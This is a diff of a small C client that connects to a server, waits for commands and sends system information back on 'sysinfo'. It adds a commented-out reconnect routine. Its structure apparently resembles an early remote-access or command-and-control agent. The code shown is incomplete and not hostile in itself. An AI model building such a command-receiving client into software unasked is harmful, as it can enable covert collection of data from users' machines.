@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <unistd.h>
 
 #include "prompt.h"
 #include "network.h"
@@ -13,20 +14,30 @@ int main() // Program's entry point.
 	socket_fd = server_connect();
 
 	if (socket_fd != -1) { // Check if server_connect() succeeded.
-		printf("Connected to server!\n"); // for debugging.
+		printf("[V] Connected to server!\n"); // For debugging.
 		is_connected = 1;
 	} 
 
 	while (is_connected) {
-		if (receive_data(socket_fd, recv_data) != 0) { // recveive data from socket.
-			printf("Command: %s\n", recv_data); // for debugging.
+		if (receive_data(socket_fd, recv_data) != 0) { // Recveive data from socket.
+			printf("Command: %s\n", recv_data); // For debugging.
 
 			if (strcmp(recv_data, "sysinfo") == 0) {
 				send_data(socket_fd, get_system_info());
 			}
+			
 		}
 		memset(recv_data, '\0', 256);	
+
+
+		// This part is still very buggy.
+		//if (check_connection(socket_fd) == -1) {
+		//	printf("Lost connection.\n");
+		//	reconnect();
+		//	printf("[V] Reconnected");
+		//}
+		
 	}
 
 	return 0;
-}
+}	
